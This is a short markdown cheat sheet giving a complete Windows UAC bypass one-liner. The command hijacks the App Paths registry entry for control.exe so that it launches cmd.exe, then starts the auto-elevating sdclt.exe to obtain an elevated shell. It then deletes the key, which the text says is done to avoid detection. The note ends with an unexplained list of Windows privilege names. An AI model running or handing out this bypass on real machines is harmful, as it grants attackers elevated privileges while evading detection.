## UAC(User Account Control) Bypass via ``sdclt.exe`` and App Path Hijak

### Command

```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f && START /W sdclt.exe && reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
```

---

### How it Works

#### 1. Registry Hijack

*   Adds a key to ``App Paths`` under ``HKCU`` that changes how ``control.exe`` is resolved
*   Instead of launching the Control Panel it will launch ``cmd.exe``

```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
```

#### 2. Trigger Auto-Elevation

* Launches ``sdclt.exe``, a trusted Microsoft binary with auto-elevation
*   ``sdclt.exe`` internally attempts to launch ``control.exe``, which due to the registry hijack actually launches ``cmd.exe``
*   As a result ``cmd.exe`` **runs with elevated privileges**

```cmd
START /W sdclt.exe
```

#### 3. Cleanup

*   Deletes the hijacked registry key to avoid persistence or detection

```cmd
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f
```

seBackup 
seRestore
seImpersonate
setimezone